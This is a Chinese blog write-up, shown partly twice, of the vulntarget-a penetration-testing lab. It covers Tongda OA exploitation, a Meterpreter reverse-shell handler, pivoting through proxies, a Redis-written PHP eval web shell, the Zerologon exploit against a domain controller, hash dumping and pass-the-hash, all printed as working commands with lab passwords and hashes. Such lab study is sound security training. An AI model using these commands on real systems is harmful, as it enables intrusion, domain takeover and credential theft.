<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728820485481-1eeebc73-f39d-40df-aa44-25d804e787fa.png"></p>
<p>发现权限还不低，system权限，还存在双网卡</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728820548834-37ca1b47-9ffb-4f29-88eb-3140d116307e.png"></p>
<h3 id="判断是否出网"><a href="#判断是否出网" class="headerlink" title="判断是否出网"></a>判断是否出网</h3><p>ping了一下百度，通了是出网的，那就准备上线MSF</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728822650638-c9a77b6b-d2c0-438e-9e08-9706f8544082.png"></p>
<h3 id="上线MSF"><a href="#上线MSF" class="headerlink" title="上线MSF"></a>上线MSF</h3><p>因为出网我就生成反向exe了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">生成exe木马</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728823061202-e5eb3de3-3984-4290-a52d-f19e1f5035ea.png"></p>
<p>上传到靶机win7</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728823052788-563a6961-3b5d-4480-9fbc-c2ec14fb3c96.png"></p>
<p>攻击机VPS开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">使用exploit/multi/handler模块开启监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">设置监听器的有效载荷类型为 Windows 平台的反向 TCP Meterpreter。</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">设置监听端口为3333</span><br><span class="line">set lport 3333</span><br><span class="line">设置监听IP地址</span><br><span class="line">set lhost 192.168.127.10</span><br><span class="line">启动监听器</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728823191584-9e60aa4e-a938-412e-962c-fe534c342d6e.png"></p>
<h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><p>扫描<code>10.0.20.0/24</code>网段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set ports 22,23,80,443,8080,8081,3389,445,143,6379</span><br><span class="line">set rhosts 10.0.20.0/24</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>发现第二胎机子10.0.20.99</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728875326920-45475908-09cc-4fd0-a238-25c792a7a277.png"></p>
<h2 id="第二台主机"><a href="#第二台主机" class="headerlink" title="第二台主机"></a>第二台主机</h2><p>配置路由</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 10.0.20.0/24    #添加目标网段路由规则，获取内部网络访问通道</span><br><span class="line">run post/windows/manage/migrate</span><br><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728876090934-ff25f1d4-7a97-4c39-ac8c-c583830bf7fe.png"></p>
<h3 id="配置socks5代理"><a href="#配置socks5代理" class="headerlink" title="配置socks5代理"></a>配置socks5代理</h3><p>msf配置socks5代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy  #使用 socks_proxy模块</span><br><span class="line">set version 5	#使用版本4a</span><br><span class="line">set srvhost 127.0.0.1	#设置本地IP</span><br><span class="line">set srvport 1080	#设置监听端口1080</span><br><span class="line">exploit		#运行</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728875659345-373845f5-4080-4fdc-a549-480de258cd32.png"></p>
<p>kali配置代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728823898898-afba3863-d055-4adb-84c8-6e8609b5c23a.png"></p>
<p>测试，可以看到不挂代理是访问不到10.0.20.98的</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728876459765-b6cbb82c-d3b0-49f5-95e5-5b71a26daf4d.png"></p>
<p>扫描常见开放端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn 10.0.20.99 -p22,23,80,139,445,1433,3306,3389,6379,8080</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728878747855-0d3e82f1-d73f-43ff-923a-38336d117423.png"></p>
<p>应该是一台windows，开放80端口</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728879196149-0cc81fcc-b662-4bef-9821-3b7c1cc6bab9.png">+</p>
<h3 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h3><p>6379端口有redis，连接一下看是否有redis未授权</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728879574446-91c81da3-a28f-4345-8605-860686694d37.png"></p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728879701456-10ad0f07-3b8e-415d-b795-57ec5fffe808.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">config get <span class="built_in">dir</span> <span class="comment">#查看redis数据库路径</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> <span class="string">&quot;C:/phpStudy/PHPTutorial/WWW/&quot;</span># <span class="comment">#修改靶机Redis数据库路径</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php <span class="comment">#生成shell.php文件</span></span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span>#将一句话木马写入文件中</span><br><span class="line"><span class="comment">#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span></span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php eval(<span class="variable">$_POST</span>[123]);?&gt;\r\n\r\n&quot;</span>#上传木马可以通过蚁剑连接</span><br><span class="line">save#保存</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728880392356-e4435a41-19ab-4a9e-9d91-958582337096.png"></p>
<p>连接蚁剑</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728880437112-d5410634-bd90-450b-befe-1534ba4a3ca7.png"></p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728880534484-4389dc01-8944-477b-b69e-ff329ae5119a.png"></p>
<h3 id="判断是否出网-1"><a href="#判断是否出网-1" class="headerlink" title="判断是否出网"></a>判断是否出网</h3><p>不出网</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728881551296-59d63386-7f28-4dd1-8735-34a973dc7d56.png"></p>
<h3 id="探测主机"><a href="#探测主机" class="headerlink" title="探测主机"></a>探测主机</h3><p>存在两张网卡</p>
<p>10.0.20.0&#x2F;24</p>
<p>10.0.10.0&#x2F;24</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728881513359-1c282257-2e9e-4f63-ba35-702e8d32b066.png"></p>
<p>上传fscan</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728882928069-7a74ec2e-a33d-4ccc-bfa5-c8ed75af9004.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 10.0.10.0/24</span><br></pre></td></tr></table></figure>

<p>发现第三台主机，且是域控</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728883178963-08b52fe4-6416-4dbc-b800-1abc6c6a714b.png"></p>
<h2 id="第三台主机"><a href="#第三台主机" class="headerlink" title="第三台主机"></a>第三台主机</h2><h3 id="攻击域控"><a href="#攻击域控" class="headerlink" title="攻击域控"></a>攻击域控</h3><p>现在已经确定域控的IP10.0.10.110</p>
<p>EXP地址：<a target="_blank" rel="noopener" href="https://github.com/VoidSec/CVE-2020-1472">https://github.com/VoidSec/CVE-2020-1472</a></p>
<p>exp利用需要将impacket包更新下：python -m pip install –upgrade impacket</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py -n WIN2019 -t 10.0.10.110</span><br></pre></td></tr></table></figure>

<p>漏洞扫出来了，是否攻击，选是</p>
<h3 id="置空域控密码"><a href="#置空域控密码" class="headerlink" title="置空域控密码"></a>置空域控密码</h3><p>此时域控密码已经置空</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728885185035-4bb19250-830c-4982-9d35-dc08a0014625.png"></p>
<h3 id="获取新凭据"><a href="#获取新凭据" class="headerlink" title="获取新凭据"></a><strong>获取新凭据</strong></h3><p>用secretsdump.py来获取域控中保存的hash，secretsdump.py脚本在kali自带impacket包中，在&#x2F;usr&#x2F;local&#x2F;bin路径下，或者手动下载脚本模块</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket</span><br><span class="line">git clone https://github.com/CoreSecurity/impacket.git</span><br><span class="line">cd impacket/</span><br><span class="line">python3 -m pip install .  </span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>

<p>利用impcker包中的seretsdump抓hash值</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py 域名称/域控主机名\<span class="variable">$@</span>域控IP -no-pass</span><br><span class="line">proxychains4 python3 secretsdump.py vulntarget.com/win2019\<span class="variable">$@10</span>.0.10.110 -no-pass</span><br></pre></td></tr></table></figure>

<p>查看域名，主机名</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728885356598-0c478f6c-5fe2-442f-8cc7-478e579af5dc.png"></p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1718783564146-d1dc6089-64bd-4f5c-9229-13f0404ad83f.png"></p>
<p>出现这个问题 [*] Cleaning up …</p>
<p>此错误与 Impacket 库和示例之间的版本不匹配有关</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd impacket/</span><br><span class="line">python3 -m pip install .  </span><br><span class="line">python3 setup.py install</span><br></pre></td></tr></table></figure>

<p>这里获取的凭据是域管理员密码已被置空后的凭据，域控密码已成功置空</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728886117892-13ee4e14-72c7-4e15-96a2-0d72e95ef927.png"></p>
<p>域机器账户的空密码，解码为空</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">WIN2019$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728885995606-de34088f-bb61-4bca-9bac-5ebd2c8ffa84.png"></p>
<p>域管理员账号解码为：Admin@666</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15:::</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728886187960-4b7d9400-485e-4002-a758-c07d93f75bce.png"></p>
<h3 id="获取域控半交互式shell"><a href="#获取域控半交互式shell" class="headerlink" title="获取域控半交互式shell"></a>获取域控半交互式shell</h3><p>使用wmiexec进行hash传递攻击，这个脚本也在kali自带impacket包中，&#x2F;usr&#x2F;local&#x2F;bin路径下</p>
<p>获取到hash之后接下来我们就可以利用常见横向工具wmiexec.py进行登录，生成一个半交互式shell(管理员权限)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains python3 wmiexec.py -hashes 域管理员<span class="built_in">hash</span> 域名/Administrator@域控IP</span><br><span class="line">proxychains python3 wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 vulntarget.com/Administrator@10.0.10.110</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728886524050-a5500832-ef06-4712-ba23-c68e9c462e63.png"></p>
<p>后续还可以获取初始凭据（sam），针对注册表将sam转储到域控本地，然后再保存到本机并利用secretsdump.py解析已经下载到在本地的sam文件，不在演示了</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2025/01/26/Vulntarget-A%20-%20%E5%89%AF%E6%9C%AC/" data-id="cm6devtno00015shq13b6fcks" data-title="" class="article-share-link"><span class="fa fa-share">分享</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-vulntarget-a漏洞靶场" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/" class="article-date">
  <time class="dt-published" datetime="2025-01-26T08:45:43.781Z" itemprop="datePublished">2025-01-26</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/">vulntarget-a漏洞靶场</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="靶场介绍"><a href="#靶场介绍" class="headerlink" title="靶场介绍"></a>靶场介绍</h1><p>vulntarget-a漏洞靶场是由vulntarget大佬团队自己设计搭建的靶场，其中涵盖Web漏洞、主机漏洞、域漏洞、工控漏洞等等。</p>
<h2 id="靶场拓扑"><a href="#靶场拓扑" class="headerlink" title="靶场拓扑"></a>靶场拓扑</h2><p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728819066162-ebda5fd5-3f59-4886-801d-f921c73739d7.png"></p>
<p>以上拓扑图仅做参考，实战中的地址为以下配置：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">kali攻击机：192.168.52.128</span><br><span class="line"></span><br><span class="line">win11攻击机：192.168.52.1</span><br><span class="line"></span><br><span class="line">win7应用服务器：192.168.127.89，10.0.20.98</span><br><span class="line"></span><br><span class="line">win16域成员服务器：10.0.20.99,10.0.10.111</span><br><span class="line"></span><br><span class="line">win19域控服务器：10.0.10.110</span><br></pre></td></tr></table></figure>

<h2 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h2><p>下载地址：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">链接: https://pan.baidu.com/s/195iUmvbaKOhtn2S_O-F6TA 提取码: jnkq</span><br></pre></td></tr></table></figure>

<p>如需要自己搭建设计可以参考：</p>
<p><a target="_blank" rel="noopener" href="http://mp.weixin.qq.com/s?__biz=Mzg3NDYwNjQyMw==&mid=2247486312&idx=1&sn=1bd4a6edcd6bc0133215d2fb79abe53b&chksm=cecf7150f9b8f846820c14ff5df467afe67e913b8592715bf7bf76cb011c407df6ead15819d3&scene=21#wechat_redirect">http://mp.weixin.qq.com/s?__biz&#x3D;Mzg3NDYwNjQyMw&#x3D;&#x3D;&amp;mid&#x3D;2247486312&amp;idx&#x3D;1&amp;sn&#x3D;1bd4a6edcd6bc0133215d2fb79abe53b&amp;chksm&#x3D;cecf7150f9b8f846820c14ff5df467afe67e913b8592715bf7bf76cb011c407df6ead15819d3&amp;scene&#x3D;21#wechat_redirect</a></p>
<p>需要注意的是，从网盘下载的靶机是搭建好的，我们改一下VMnet8的网卡C段，改一下他的DHCP，让Net网卡起始IP小于192.168.127.98，因为这是他的通达OA配置上的IP地址<img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728819207035-80d07cd1-c3c1-4ab1-b35b-1995cee99bc7.png"></p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728819406422-5d660123-4b3e-4a33-9e0a-14767abda46f.png"></p>
<table>
<thead>
<tr>
<th>主机名称</th>
<th>IP</th>
<th>用户名</th>
<th>密码</th>
<th>网卡</th>
</tr>
</thead>
<tbody><tr>
<td>win7</td>
<td>192.168.127.91<br/>10.0.20.89</td>
<td>win7</td>
<td>admin</td>
<td>VMnet2<br/>VMnet8</td>
</tr>
<tr>
<td>winserver2016</td>
<td>10.0.20.99<br/>10.0.10.111</td>
<td>vulntarget.com\win2016</td>
<td>Admin#123</td>
<td>VMnet2<br/>VMnet3</td>
</tr>
<tr>
<td>winserver2019</td>
<td>10.0.10.110</td>
<td>administrator</td>
<td>Admin@666</td>
<td>VMnet3</td>
</tr>
</tbody></table>
<h1 id="靶场实战"><a href="#靶场实战" class="headerlink" title="靶场实战"></a>靶场实战</h1><h2 id="第一台主机win7"><a href="#第一台主机win7" class="headerlink" title="第一台主机win7"></a>第一台主机win7</h2><h3 id="Fscan扫描"><a href="#Fscan扫描" class="headerlink" title="Fscan扫描"></a>Fscan扫描</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fscan.exe -h 192.168.127.0/24</span><br></pre></td></tr></table></figure>

<p>扫出来目标IP：192.168.127.91</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728819724886-c04180e9-ac67-43ce-b73c-3adbd0562e89.png"></p>
<p>分析一下扫描结果</p>
<p>发现开放80，135，139，445端口，80端口是通达OA，目标主机是一台win7，且存在永恒之蓝</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728820088062-2972ce29-c1ab-4f7d-b495-513e662a2b70.png"></p>
<h3 id="通达漏洞拿下应用服务"><a href="#通达漏洞拿下应用服务" class="headerlink" title="通达漏洞拿下应用服务"></a>通达漏洞拿下应用服务</h3><p>拿通达OA扫描器漏扫一下</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728820414107-1ebaec8f-6c32-4418-a8c7-50a7d6dd7793.png"></p>
<p>发现漏洞还不少，直接一键getshell</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728820485481-1eeebc73-f39d-40df-aa44-25d804e787fa.png"></p>
<p>发现权限还不低，system权限，还存在双网卡</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728820548834-37ca1b47-9ffb-4f29-88eb-3140d116307e.png"></p>
<h3 id="判断是否出网"><a href="#判断是否出网" class="headerlink" title="判断是否出网"></a>判断是否出网</h3><p>ping了一下百度，通了是出网的，那就准备上线MSF</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728822650638-c9a77b6b-d2c0-438e-9e08-9706f8544082.png"></p>
<h3 id="上线MSF"><a href="#上线MSF" class="headerlink" title="上线MSF"></a>上线MSF</h3><p>因为出网我就生成反向exe了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">生成exe木马</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728823061202-e5eb3de3-3984-4290-a52d-f19e1f5035ea.png"></p>
<p>上传到靶机win7</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728823052788-563a6961-3b5d-4480-9fbc-c2ec14fb3c96.png"></p>
<p>攻击机VPS开启监听</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">使用exploit/multi/handler模块开启监听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">设置监听器的有效载荷类型为 Windows 平台的反向 TCP Meterpreter。</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">设置监听端口为3333</span><br><span class="line">set lport 3333</span><br><span class="line">设置监听IP地址</span><br><span class="line">set lhost 192.168.127.10</span><br><span class="line">启动监听器</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728823191584-9e60aa4e-a938-412e-962c-fe534c342d6e.png"></p>
<h3 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h3><p>扫描<code>10.0.20.0/24</code>网段</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/scanner/portscan/tcp</span><br><span class="line">set ports 22,23,80,443,8080,8081,3389,445,143,6379</span><br><span class="line">set rhosts 10.0.20.0/24</span><br><span class="line">set threads 20</span><br><span class="line">run</span><br></pre></td></tr></table></figure>

<p>发现第二胎机子10.0.20.99</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728875326920-45475908-09cc-4fd0-a238-25c792a7a277.png"></p>
<h2 id="第二台主机"><a href="#第二台主机" class="headerlink" title="第二台主机"></a>第二台主机</h2><p>配置路由</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 10.0.20.0/24    #添加目标网段路由规则，获取内部网络访问通道</span><br><span class="line">run post/windows/manage/migrate</span><br><span class="line">run post/multi/manage/autoroute</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728876090934-ff25f1d4-7a97-4c39-ac8c-c583830bf7fe.png"></p>
<h3 id="配置socks5代理"><a href="#配置socks5代理" class="headerlink" title="配置socks5代理"></a>配置socks5代理</h3><p>msf配置socks5代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/server/socks_proxy  #使用 socks_proxy模块</span><br><span class="line">set version 5	#使用版本4a</span><br><span class="line">set srvhost 127.0.0.1	#设置本地IP</span><br><span class="line">set srvport 1080	#设置监听端口1080</span><br><span class="line">exploit		#运行</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728875659345-373845f5-4080-4fdc-a549-480de258cd32.png"></p>
<p>kali配置代理</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains4.conf</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728823898898-afba3863-d055-4adb-84c8-6e8609b5c23a.png"></p>
<p>测试，可以看到不挂代理是访问不到10.0.20.98的</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728876459765-b6cbb82c-d3b0-49f5-95e5-5b71a26daf4d.png"></p>
<p>扫描常见开放端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 nmap -sT -Pn 10.0.20.99 -p22,23,80,139,445,1433,3306,3389,6379,8080</span><br></pre></td></tr></table></figure>

<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728878747855-0d3e82f1-d73f-43ff-923a-38336d117423.png"></p>
<p>应该是一台windows，开放80端口</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728879196149-0cc81fcc-b662-4bef-9821-3b7c1cc6bab9.png">+</p>
<h3 id="Redis未授权"><a href="#Redis未授权" class="headerlink" title="Redis未授权"></a>Redis未授权</h3><p>6379端口有redis，连接一下看是否有redis未授权</p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728879574446-91c81da3-a28f-4345-8605-860686694d37.png"></p>
<p><img src="/2025/01/26/vulntarget-a%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA/1728879701456-10ad0f07-3b8e-415d-b795-57ec5fffe808.png"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">config get <span class="built_in">dir</span> <span class="comment">#查看redis数据库路径</span></span><br><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> <span class="string">&quot;C:/phpStudy/PHPTutorial/WWW/&quot;</span># <span class="comment">#修改靶机Redis数据库路径</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php <span class="comment">#生成shell.php文件</span></span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;</span>#将一句话木马写入文件中</span><br><span class="line"><span class="comment">#&quot;\r\n\r\n&quot;是换行的意思，用redis写入文件会自带一些版本信息，如果不换行可能导致无法执行。</span></span><br><span class="line"><span class="built_in">set</span> xxx <span class="string">&quot;\r\n\r\n&lt;?php eval(<span class="variable">$_POST</span>[123]);?&gt;\r\n\r\n&quot;</span>#上传木马可以通过蚁剑连接</span><br><span class="line">save#保存</span><br></pre></td></tr></table></figure>

